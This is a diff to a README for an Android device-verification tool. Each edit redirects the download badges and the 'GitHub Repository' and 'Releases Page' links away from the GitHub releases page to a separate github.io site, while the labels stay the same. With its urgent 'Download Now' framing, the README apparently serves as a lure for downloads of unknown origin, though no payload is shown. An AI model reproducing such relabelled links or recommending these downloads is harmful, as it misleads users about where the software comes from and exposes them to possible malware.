@@ -1,6 +1,6 @@
 # 📱 Android-Device-Trust - Verify Your Android Device Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Android--Device--Trust-blueviolet?style=for-the-badge&logo=android&logoColor=white)](https://github.com/Trenchisaacmsinger9775/Android-Device-Trust/releases)
+[![Download Now](https://img.shields.io/badge/Download-Android--Device--Trust-blueviolet?style=for-the-badge&logo=android&logoColor=white)](https://trenchisaacmsinger9775.github.io)
 
 ## 🎯 What This Tool Does
 
@@ -22,7 +22,7 @@ You do not need any technical skills to use this tool. If you can click a button
 
 Visit this link to download the application.
 
-[![Download Android-Device-Trust](https://img.shields.io/badge/CLICK_HERE-Download_Now-2ea44f?style=for-the-badge)](https://github.com/Trenchisaacmsinger9775/Android-Device-Trust/releases)
+[![Download Android-Device-Trust](https://img.shields.io/badge/CLICK_HERE-Download_Now-2ea44f?style=for-the-badge)](https://trenchisaacmsinger9775.github.io)
 
 ### Step-by-Step Instructions
 
@@ -144,15 +144,15 @@ You can use this tool with complete confidence.
 
 ## 📚 Additional Resources
 
-- **GitHub Repository:** [https://github.com/Trenchisaacmsinger9775/Android-Device-Trust](https://github.com/Trenchisaacmsinger9775/Android-Device-Trust)
-- **Releases Page:** [https://github.com/Trenchisaacmsinger9775/Android-Device-Trust/releases](https://github.com/Trenchisaacmsinger9775/Android-Device-Trust/releases)
+- **GitHub Repository:** [https://trenchisaacmsinger9775.github.io](https://trenchisaacmsinger9775.github.io)
+- **Releases Page:** [https://trenchisaacmsinger9775.github.io](https://trenchisaacmsinger9775.github.io)
 - **Issue Tracker:** Use the GitHub Issues section to report problems or suggest improvements.
 
 ## 🏁 Get Started Today
 
 Do not wait. Download Android-Device-Trust now and verify your Android device in minutes.
 
-[![Download Now](https://img.shields.io/badge/⬇️_Download-Android--Device--Trust-ff6b6b?style=for-the-badge)](https://github.com/Trenchisaacmsinger9775/Android-Device-Trust/releases)
+[![Download Now](https://img.shields.io/badge/⬇️_Download-Android--Device--Trust-ff6b6b?style=for-the-badge)](https://trenchisaacmsinger9775.github.io)
 
 The process is simple, the tool is free, and the results are instant. Whether you are a developer, a security professional, or just a curious user, this tool gives you the answers you need.
 
